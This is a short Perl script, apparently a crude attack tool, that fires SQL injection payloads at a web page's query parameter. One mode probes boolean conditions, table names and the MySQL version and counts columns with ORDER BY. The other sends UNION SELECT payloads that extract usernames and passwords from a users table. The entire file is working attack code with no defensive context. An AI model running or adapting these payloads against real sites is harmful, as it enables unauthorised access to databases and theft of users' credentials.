use LWP::Simple;

if (@ARGV < 3)
	{
	    print "Usage: ./blind_tool.pl <Host> <max columns> <test 1 or 2>\n";
		print "Test 1 is a basic test to determine the number of columns\n";
		print "Test 2 is an basic attemt to retrieve the users and passwords\n";
		print "In Test 2 you define the last successful column.";
	    print "Ex. ./blind_tool.pl www.hackme.com/ktp/index.php?page= 10 1\n";
	}

	$url=$ARGV[0];
	$max_columns=$ARGV[1];
	$test=$ARGV[2];

if ($test==1){	
@sql_tests = ("1 AND 1=1","1 and 1=0","1 AND (SELECT Count(*) FROM admin)","1 AND (SELECT Count(*) FROM users)","1 AND(SELECT Count(username) FROM users)","1 and (select 1 from mysql.user limit 0,1)=1",'1 and substring(@@version,1,1)=4','1 and substring(@@version,1,1)=5');
print "Performing some basic tests ..."."\n";
foreach $sql_test(@sql_tests){
print "Testing ".$sql_test."\n";
$content = get($url.$sql_test);
print $content."\n";
}	
	
$sql_columns="1+ORDER+BY+";
for ($i=1;$i <= $max_columns; $i++){
print "Testing ".$sql_columns.$i."\n";
$content = get($url.$sql_columns.$i);
print $content."\n";
}

}

$query="";
if ($max_columns>3){
for($i=4;$i <= $max_columns; $i++){
$query=",".$i;

}
}

@sql_test2=("null+union+all+select+1,username,password".$query."+from+users--","1 union all select 1,2,username from users/*","1 union all select 1,2,password from users/*","1 union all select 1,2,concat(username,0x3a,password)from users/*"); 
if ($test==2){ 
foreach $sql_test2(@sql_test2){
print "Testing ".$sql_test2."\n";
$content = get($url.$sql_test2);
print $content."\n";
}
}

